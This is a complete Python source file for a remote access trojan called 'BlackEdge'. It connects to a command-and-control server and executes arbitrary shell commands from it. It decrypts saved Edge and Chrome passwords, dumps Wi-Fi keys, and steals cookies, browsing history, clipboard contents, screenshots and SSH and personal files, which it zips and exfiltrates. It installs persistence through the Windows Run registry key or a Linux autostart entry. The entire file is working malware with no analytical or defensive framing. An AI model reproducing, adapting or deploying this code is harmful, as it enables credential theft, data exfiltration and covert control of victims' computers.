import os
import sys
import json
import base64
import sqlite3
import shutil
import subprocess
import threading
import time
import socket
import platform
import getpass
import win32crypt  # pip install pywin32
from Crypto.Cipher import AES  # pip install pycryptodome
import requests

class BlackEdge:
    def __init__(self, c2_host="127.0.0.1", c2_port=4444):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.sock = None
        self.running = True
        self.user = getpass.getuser()
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        
    def connect(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.c2_host, self.c2_port))
                return True
            except:
                time.sleep(10)
        return False

    def get_edge_passwords(self):
        """extract edge saved passwords"""
        try:
            edge_path = os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
            if not os.path.exists(edge_path):
                return None
            
            # copy to temp to avoid lock
            temp_path = os.path.join(os.environ['TEMP'], 'edge_login.db')
            shutil.copy2(edge_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            passwords = []
            for row in cursor.fetchall():
                url, username, encrypted = row
                if encrypted:
                    try:
                        # decrypt using win32crypt
                        decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": decrypted.decode('utf-8')
                        })
                    except:
                        pass
            
            conn.close()
            os.remove(temp_path)
            return passwords
        except:
            return None

    def get_chrome_passwords(self):
        """extract chrome saved passwords (v80+ uses AES)"""
        try:
            local_state = os.path.join(self.appdata, 'Google', 'Chrome', 'User Data', 'Local State')
            if not os.path.exists(local_state):
                return None
            
            with open(local_state, 'r') as f:
                data = json.load(f)
            master_key = base64.b64decode(data['os_crypt']['encrypted_key'])
            master_key = master_key[5:]  # remove 'DPAPI' prefix
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            
            login_path = os.path.join(self.appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            temp_path = os.path.join(os.environ['TEMP'], 'chrome_login.db')
            shutil.copy2(login_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            passwords = []
            for row in cursor.fetchall():
                url, username, encrypted = row
                if encrypted:
                    try:
                        # AES-GCM decryption
                        nonce = encrypted[3:15]
                        ciphertext = encrypted[15:-16]
                        tag = encrypted[-16:]
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": decrypted.decode('utf-8')
                        })
                    except:
                        pass
            
            conn.close()
            os.remove(temp_path)
            return passwords
        except:
            return None

    def get_firefox_passwords(self):
        """extract firefox passwords (needs logins.json)"""
        try:
            profiles = os.path.join(self.roaming, 'Mozilla', 'Firefox', 'Profiles')
            if not os.path.exists(profiles):
                return None
            
            passwords = []
            for root, dirs, files in os.walk(profiles):
                if 'logins.json' in files:
                    path = os.path.join(root, 'logins.json')
                    with open(path, 'r') as f:
                        data = json.load(f)
                        for entry in data.get('logins', []):
                            # firefox stores encrypted, need key3.db + signons.sqlite
                            # this is simplified, full extraction requires decryption
                            passwords.append({
                                "url": entry.get('hostname'),
                                "username": entry.get('usernameField'),
                                "password": "[encrypted]"
                            })
            return passwords if passwords else None
        except:
            return None

    def get_browser_history(self, browser="edge"):
        """extract browsing history"""
        try:
            if browser == "edge":
                path = os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
            elif browser == "chrome":
                path = os.path.join(self.appdata, 'Google', 'Chrome', 'User Data', 'Default', 'History')
            else:
                return None
            
            temp_path = os.path.join(os.environ['TEMP'], f'{browser}_history.db')
            shutil.copy2(path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            
            history = []
            for row in cursor.fetchall():
                history.append({"url": row[0], "title": row[1], "time": row[2]})
            
            conn.close()
            os.remove(temp_path)
            return history
        except:
            return None

    def get_cookies(self, browser="edge"):
        """extract cookies"""
        try:
            if browser == "edge":
                path = os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')
            elif browser == "chrome":
                path = os.path.join(self.appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
            else:
                return None
            
            temp_path = os.path.join(os.environ['TEMP'], f'{browser}_cookies.db')
            shutil.copy2(path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 100")
            
            cookies = []
            for row in cursor.fetchall():
                host, name, encrypted = row
                if encrypted:
                    try:
                        decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
                        cookies.append({"host": host, "name": name, "value": decrypted.decode('utf-8')})
                    except:
                        pass
            
            conn.close()
            os.remove(temp_path)
            return cookies
        except:
            return None

    def get_wifi_passwords(self):
        """extract saved wifi passwords (windows)"""
        try:
            if platform.system() != "Windows":
                return None
            
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
            profiles = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line:
                    name = line.split(':')[1].strip()
                    profiles.append(name)
            
            wifi_data = []
            for profile in profiles:
                cmd = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                result = subprocess.run(cmd, capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        wifi_data.append({"ssid": profile, "password": password})
            
            return wifi_data
        except:
            return None

    def get_system_info(self):
        """gather comprehensive system info"""
        return {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "user": getpass.getuser(),
            "arch": platform.machine(),
            "cpu": platform.processor(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "python_version": sys.version,
            "is_admin": self.is_admin()
        }

    def is_admin(self):
        """check if running as admin"""
        try:
            return os.getuid() == 0
        except:
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False

    def collect_files(self, directories=None, extensions=None, max_size_mb=10):
        """collect files from common directories"""
        if directories is None:
            directories = [
                os.path.expanduser('~/Desktop'),
                os.path.expanduser('~/Documents'),
                os.path.expanduser('~/Downloads'),
                os.path.expanduser('~/Pictures'),
                os.path.expanduser('~/.ssh'),
                os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Roaming'),
            ]
        
        if extensions is None:
            extensions = ['.txt', '.docx', '.pdf', '.xlsx', '.pptx', '.jpg', '.png', '.zip', '.rar', '.7z', '.py', '.js', '.json']
        
        collected = []
        max_bytes = max_size_mb * 1024 * 1024
        
        for directory in directories:
            if not os.path.exists(directory):
                continue
            try:
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if any(file.endswith(ext) for ext in extensions):
                            path = os.path.join(root, file)
                            size = os.path.getsize(path)
                            if size < max_bytes:
                                collected.append(path)
            except:
                continue
        
        return collected

    def upload_file(self, path):
        """read and encode file for upload"""
        try:
            with open(path, 'rb') as f:
                data = f.read()
            return {
                "name": os.path.basename(path),
                "path": path,
                "size": len(data),
                "data": base64.b64encode(data).decode('utf-8')
            }
        except:
            return None

    def zip_files(self, files, output_name="data_exfil.zip"):
        """zip files for transmission"""
        import zipfile
        zip_path = os.path.join(os.environ['TEMP'], output_name)
        with zipfile.ZipFile(zip_path, 'w') as zf:
            for file in files:
                try:
                    zf.write(file, os.path.basename(file))
                except:
                    pass
        return zip_path

    def run_persistence(self):
        """install persistence"""
        if platform.system() == "Windows":
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "BlackEdge", 0, winreg.REG_SZ, 
                                     sys.executable + " " + os.path.abspath(__file__))
                return True
            except:
                return False
        elif platform.system() == "Linux":
            try:
                autostart = os.path.expanduser('~/.config/autostart')
                os.makedirs(autostart, exist_ok=True)
                desktop = os.path.join(autostart, 'blackedge.desktop')
                with open(desktop, 'w') as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=BlackEdge
Exec=python3 {os.path.abspath(__file__)}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
                return True
            except:
                return False
        return False

    def get_installed_software(self):
        """list installed applications"""
        software = []
        if platform.system() == "Windows":
            try:
                import winreg
                keys = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                ]
                for root, key in keys:
                    try:
                        with winreg.OpenKey(root, key) as regkey:
                            i = 0
                            while True:
                                try:
                                    subkey_name = winreg.EnumKey(regkey, i)
                                    with winreg.OpenKey(regkey, subkey_name) as subkey:
                                        try:
                                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                            if name:
                                                software.append(name)
                                        except:
                                            pass
                                    i += 1
                                except WindowsError:
                                    break
                    except:
                        pass
            except:
                pass
        return software

    def get_clipboard(self):
        """capture clipboard content"""
        try:
            import pyperclip  # pip install pyperclip
            return pyperclip.paste()
        except:
            return None

    def run(self):
        """main execution"""
        if not self.connect():
            return
        
        # initial beacon with system info
        beacon = {
            "type": "beacon",
            "data": self.get_system_info()
        }
        self.sock.send(json.dumps(beacon).encode())
        
        while self.running:
            try:
                data = self.sock.recv(4096)
                if not data:
                    self.sock.close()
                    self.connect()
                    continue
                
                task = json.loads(data.decode())
                task_type = task.get("type")
                task_id = task.get("id")
                
                if task_type == "cmd":
                    result = subprocess.run(task.get("cmd", ""), shell=True, capture_output=True, text=True)
                    response = {
                        "type": "result",
                        "id": task_id,
                        "data": {
                            "stdout": result.stdout,
                            "stderr": result.stderr,
                            "returncode": result.returncode
                        }
                    }
                
                elif task_type == "grab_passwords":
                    data = {
                        "edge": self.get_edge_passwords(),
                        "chrome": self.get_chrome_passwords(),
                        "firefox": self.get_firefox_passwords(),
                        "wifi": self.get_wifi_passwords()
                    }
                    response = {"type": "result", "id": task_id, "data": data}
                
                elif task_type == "grab_files":
                    files = self.collect_files()
                    if files:
                        zip_path = self.zip_files(files[:50])  # limit to 50
                        if zip_path and os.path.exists(zip_path):
                            with open(zip_path, 'rb') as f:
                                file_data = base64.b64encode(f.read()).decode('utf-8')
                            os.remove(zip_path)
                            response = {
                                "type": "result",
                                "id": task_id,
                                "data": {
                                    "status": "success",
                                    "file_count": len(files),
                                    "archive": file_data
                                }
                            }
                        else:
                            response = {"type": "result", "id": task_id, "data": {"status": "error", "error": "zip failed"}}
                    else:
                        response = {"type": "result", "id": task_id, "data": {"status": "error", "error": "no files found"}}
                
                elif task_type == "history":
                    data = {
                        "edge_history": self.get_browser_history("edge"),
                        "chrome_history": self.get_browser_history("chrome")
                    }
                    response = {"type": "result", "id": task_id, "data": data}
                
                elif task_type == "cookies":
                    data = {
                        "edge_cookies": self.get_cookies("edge"),
                        "chrome_cookies": self.get_cookies("chrome")
                    }
                    response = {"type": "result", "id": task_id, "data": data}
                
                elif task_type == "software":
                    data = self.get_installed_software()
                    response = {"type": "result", "id": task_id, "data": data}
                
                elif task_type == "clipboard":
                    data = self.get_clipboard()
                    response = {"type": "result", "id": task_id, "data": data}
                
                elif task_type == "persist":
                    success = self.run_persistence()
                    response = {"type": "result", "id": task_id, "data": {"status": "success" if success else "failed"}}
                
                elif task_type == "download_file":
                    path = task.get("path")
                    file_data = self.upload_file(path)
                    response = {"type": "result", "id": task_id, "data": file_data}
                
                elif task_type == "screenshot":
                    if platform.system() == "Windows":
                        try:
                            import mss
                            with mss.mss() as sct:
                                screenshot = sct.shot(output=os.path.join(os.environ['TEMP'], 'screenshot.png'))
                                with open(screenshot, 'rb') as f:
                                    data = base64.b64encode(f.read()).decode('utf-8')
                                os.remove(screenshot)
                                response = {"type": "result", "id": task_id, "data": {"status": "success", "screenshot": data}}
                        except:
                            response = {"type": "result", "id": task_id, "data": {"status": "error", "error": "screenshot failed"}}
                    else:
                        response = {"type": "result", "id": task_id, "data": {"status": "error", "error": "unsupported os"}}
                
                elif task_type == "shutdown":
                    self.running = False
                    response = {"type": "result", "id": task_id, "data": {"status": "shutting down"}}
                
                else:
                    response = {"type": "result", "id": task_id, "data": {"error": f"unknown task: {task_type}"}}
                
                self.sock.send(json.dumps(response).encode())
                
            except json.JSONDecodeError:
                continue
            except socket.error:
                self.sock.close()
                self.connect()
            except Exception as e:
                continue
        
        if self.sock:
            self.sock.close()

if __name__ == "__main__":
    rat = BlackEdge()
    rat.run()